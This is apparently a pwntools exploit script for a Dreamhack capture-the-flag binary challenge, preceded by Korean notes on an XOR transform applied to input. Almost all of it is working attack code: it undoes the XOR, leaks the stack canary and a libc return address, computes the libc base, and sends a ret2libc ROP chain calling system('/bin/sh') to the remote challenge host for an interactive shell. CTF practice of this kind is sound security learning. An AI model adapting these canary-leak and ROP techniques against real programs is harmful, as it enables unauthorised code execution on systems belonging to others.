'''
buf가 rbp-0x20부터 0x100만큼 받음.
leak은 printf로 가능, v5에는 입력한 만큼의 값이 저장되는데, 1~(입력한 길이)까지 buf[i-1] = buf[i-1] ^ buf[i] 연산을 수행함.
-> buf[0]~buf[길이-1]

본래 값은 어떻게 알아내냐?
인덱스 idx 라고 가정
buf[idx] = buf[idx] ^ buf[idx+1]임을 이용.
아마 카나리 릭할 때는 그냥 카나리가 나오지 않을까?
'''

from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./prob")

buf2cnry = (0x20-0x8)+0x1 # 0x1a
libc = ELF('./libc.so.6')

HOST, PORT = "host8.dreamhack.games 13434".split()

def slog(n, a): return success(": ".join([n, hex(a)]))

def xor(pay):
    pay = bytearray(pay)
    for i in range(len(pay)-1, 0, -1):
        pay[i-1] ^= pay[i]
    return bytes(pay)

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCKER:
    p = remote("localhost", 80)
else:
    p = process(env={"LD_PRELOAD": "./libc.so.6"})

pay = xor(b'A'*buf2cnry)
p.sendafter(b'Input: ', pay)
p.recvuntil(b': ')
p.recv(0x19)

cnry = u64(b'\x00' + p.recvn(7))
slog("cnry", cnry)

pay = xor(b'A'*(buf2cnry-0x1+0x10))
p.sendafter(b'Input: ', pay)
p.recvuntil(b': ')
p.recv(0x28)

ret = u64(p.recvn(6) + b'\x00'*2)
slog("main_ret", ret)
lb = ret - 0x29d90
slog("libc_base", lb)

rop = ROP(libc)

pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
system = lb + libc.sym["system"]
ret = lb + rop.find_gadget(["ret"])[0]

# gdb.attach(p)
# pause()

pay = xor(b'\x00'*0x18 + p64(cnry) + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
p.sendafter(b'Input: ', pay)
p.recvuntil(b': ')



p.interactive()